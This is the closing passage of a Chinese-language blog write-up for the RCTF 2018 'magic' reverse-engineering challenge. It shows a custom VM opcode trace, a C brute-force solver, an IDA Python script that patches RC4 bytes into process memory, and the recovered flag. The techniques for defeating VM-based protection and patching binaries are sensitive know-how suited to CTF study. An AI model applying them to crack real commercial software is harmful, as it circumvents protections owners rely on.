AE 50    reg[5] ^= reg[0]AD 00    reg[0] = ~reg[0]AA 06 05   reg[6] = reg[5]AA 05 01   reg[5] = reg[1]  ;cmpstrA9 53   reg[5] += reg[3]A0 05   reg[5] = *(byte)reg[5]  ;cmpstr[i]AF 56 00   reg[5] = (reg[5] == reg[6])A7 01   if (reg[5] == 1) vip += 1CCA9 35   reg[3] += reg[5]AA 05 03   reg[5] = reg[3]AF 54 00    reg[5] = (reg[5] == reg[4])A6 D1  if (reg[5] == 0) vip +=0xD1CC</code></pre><hr><pre><code>根据上述分析得到的opcode写出爆破求解程序如下：</code></pre>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> cmpstr[] = &#123; <span class="number">0x89</span>, <span class="number">0xC1</span>, <span class="number">0xEC</span>, <span class="number">0x50</span>, <span class="number">0x97</span>, <span class="number">0x3A</span>, <span class="number">0x57</span>, <span class="number">0x59</span>, <span class="number">0xE4</span>, <span class="number">0xE6</span>, <span class="number">0xE4</span>, <span class="number">0x42</span>, <span class="number">0xCB</span>, <span class="number">0xD9</span>, <span class="number">0x08</span>, <span class="number">0x22</span>, <span class="number">0xAE</span>, <span class="number">0x9D</span>, <span class="number">0x7C</span>, <span class="number">0x07</span>, <span class="number">0x80</span>, <span class="number">0x8F</span>, <span class="number">0x1B</span>, <span class="number">0x45</span>, <span class="number">0x04</span>, <span class="number">0xE8</span> &#125;;</span><br><span class="line"><span class="keyword">char</span> temp = <span class="number">0x66</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">26</span>; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">255</span>; j++) &#123;</span><br><span class="line"><span class="keyword">char</span> t = ((j + <span class="number">0xcc</span>) &amp; <span class="number">0xFF</span>) ^ temp;</span><br><span class="line"><span class="keyword">if</span> (cmpstr[i] == t) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%x "</span>, j);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">temp = (~temp)&amp;<span class="number">0xff</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><pre><code>得到的结果如下</code></pre>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x23 0x8c 0xbe 0xfd 0x25 0xd7 0x65 0xf4 0xb6 0xb3 0xb6 0xf 0xe1 0x74 0xa2 0xef 0xfc 0x38 0x4e 0xd2 0x1a 0x4a 0xb1 0x10 0x96 0xa5</span><br></pre></td></tr></table></figure><pre><code>由于rc4加解密过程一样，所以把上述字符串作为输入，利用源程序的rc4的密钥求解，把上述字符串作为输入可以通过脚本修改，脚本来自http://ahageek.com/blog/rctf2018-magic-writeup/</code></pre>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> idaapi <span class="keyword">import</span> *</span><br><span class="line">rc4ed = [<span class="number">0x23</span>,<span class="number">0x8c</span>,<span class="number">0xbe</span>,<span class="number">0xfd</span>,<span class="number">0x25</span>,<span class="number">0xd7</span>,<span class="number">0x65</span>,<span class="number">0xf4</span>,<span class="number">0xb6</span>,<span class="number">0xb3</span>,<span class="number">0xb6</span>,<span class="number">0xf</span>,<span class="number">0xe1</span>,<span class="number">0x74</span>,<span class="number">0xa2</span>,<span class="number">0xef</span>,<span class="number">0xfc</span>,<span class="number">0x38</span>,<span class="number">0x4e</span>,<span class="number">0xd2</span>,<span class="number">0x1a</span>,<span class="number">0x4a</span>,<span class="number">0xb1</span>,<span class="number">0x10</span>,<span class="number">0x96</span>,<span class="number">0xa5</span>]</span><br><span class="line">rcx = idc.GetRegValue(<span class="string">'rcx'</span>)</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> addr <span class="keyword">in</span> range(rcx, rcx + <span class="number">0x1A</span>):</span><br><span class="line">    idc.PatchByte(addr, rc4ed[i])</span><br><span class="line">    i = i + <span class="number">1</span></span><br></pre></td></tr></table></figure><pre><code>最后得到字符串如下@ck_For_fun_02508iO2_2iOR}在打过补丁的程序中输入上述flag，得到另一半flag：rctf{h</code></pre>  <img src="/VM保护合集/1531308757507.png" title="maigc_9"><p>  综上整个flag为：rctf{h@ck_For_fun_02508iO2_2iOR}</p><blockquote><p>参考内容</p><p><a href="https://mp.weixin.qq.com/s/4Nfso1OuHeQgCTGYv2IF5Q" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/4Nfso1OuHeQgCTGYv2IF5Q</a></p><p><a href="https://www.anquanke.com/post/id/145553" target="_blank" rel="noopener">https://www.anquanke.com/post/id/145553</a></p><p><a href="https://blog.csdn.net/liutianshx2012/article/details/48466327?locationNum=7&amp;fps=1" target="_blank" rel="noopener">https://blog.csdn.net/liutianshx2012/article/details/48466327?locationNum=7&amp;fps=1</a></p><p><a href="http://ahageek.com/blog/rctf2018-magic-writeup/" target="_blank" rel="noopener">http://ahageek.com/blog/rctf2018-magic-writeup/</a></p><p><a href="https://www.52pojie.cn/thread-742361-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-742361-1-1.html</a></p><p><a href="https://www.xctf.org.cn/media/infoattach/b805a17b85c54091975aab3709b7a5bb.pdf" target="_blank" rel="noopener">https://www.xctf.org.cn/media/infoattach/b805a17b85c54091975aab3709b7a5bb.pdf</a></p><p><a href="http://www.cs.cmu.edu/afs/cs/academic/class/15213-s02/www/applications/recitation/recitation7/B/r07-B.pdf" target="_blank" rel="noopener">http://www.cs.cmu.edu/afs/cs/academic/class/15213-s02/www/applications/recitation/recitation7/B/r07-B.pdf</a></p></blockquote>]]></content>
      
      <categories>
          
          <category> Binary security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Re </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
